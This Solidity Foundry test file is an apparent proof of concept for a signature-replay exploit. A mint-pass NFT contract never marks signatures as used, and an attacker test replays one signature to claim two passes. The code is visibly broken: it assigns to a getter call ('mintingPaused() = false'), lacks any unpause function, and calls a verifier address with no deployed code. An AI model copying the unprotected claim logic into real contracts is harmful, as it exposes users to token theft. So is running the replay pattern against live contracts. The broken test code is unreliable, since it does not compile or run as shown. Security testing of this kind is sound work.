// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Burnable.sol";

interface IVerification {
    function verify(address user, uint8 passType, bytes memory signature) external view returns (bool);
}

contract AAMintPass is ERC721, ERC721Burnable {
    address public founderAddress;
    address public delegatedAddress;
    mapping(address => bool) public isAdmin;
    mapping(address => mapping(uint8 => uint8)) public passesClaimed;
    bool public mintingPaused = true;
    uint256 public numTokensOutstanding = 0;
    uint256 public numTokensBurned = 0;

    constructor(address _founderAddress, address _delegatedAddress) 
        ERC721("AI Arena Mint Pass", "AAMP") 
    {
        delegatedAddress = _delegatedAddress;
        founderAddress = _founderAddress;
        isAdmin[founderAddress] = true;
    }

    function claimPass(uint8 passType, bytes memory signature) external {
        require(!mintingPaused, "Minting is paused");
        require(IVerification(delegatedAddress).verify(msg.sender, passType, signature), "Invalid signature");
        passesClaimed[msg.sender][passType]++;
        numTokensOutstanding++;
        _mint(msg.sender, numTokensOutstanding);
    }
}

contract ExploitTest is Test {
    AAMintPass mintPass;
    address founder = address(0x1);
    address delegated = address(0x2);
    address attacker = address(0x3);
    bytes validSignature;

    function setUp() public {
        vm.deal(attacker, 1 ether);
        mintPass = new AAMintPass(founder, delegated);
        validSignature = hex"123456"; // Mock signature for testing
        vm.prank(founder);
        mintPass.mintingPaused() = false; // Unpause minting
    }

    function test_exploit() public {
        // Step 1: Attacker claims a pass with a valid signature
        vm.prank(attacker);
        mintPass.claimPass(1, validSignature);

        // Step 2: Attacker reuses the same signature to claim another pass
        vm.prank(attacker);
        mintPass.claimPass(1, validSignature);

        // Assert the vulnerability: Attacker should have 2 passes of the same type
        assertEq(mintPass.passesClaimed(attacker, 1), 2);
    }
}